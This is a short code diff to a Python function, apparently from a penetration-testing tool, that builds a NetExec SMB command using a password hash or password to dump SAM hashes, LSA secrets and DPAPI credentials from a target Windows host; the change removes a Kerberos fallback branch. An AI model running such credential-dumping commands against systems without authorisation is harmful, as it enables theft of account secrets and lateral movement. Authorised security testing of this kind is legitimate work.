@@ -18,8 +18,7 @@ def dump_all(session):
         auth = f"-d {session.domain} -u {session.username} -H {session.hash}"
     elif session.password:
         auth = f"-d {session.domain} -u {session.username} -p \"{session.password}\""
-    else:
-        auth = f"-d {session.domain} -u {session.username} -k"
+
 
     cmd = f"nxc smb {session.target_ip} {auth} --sam --lsa --dpapi"
     out, err = run_command(cmd)
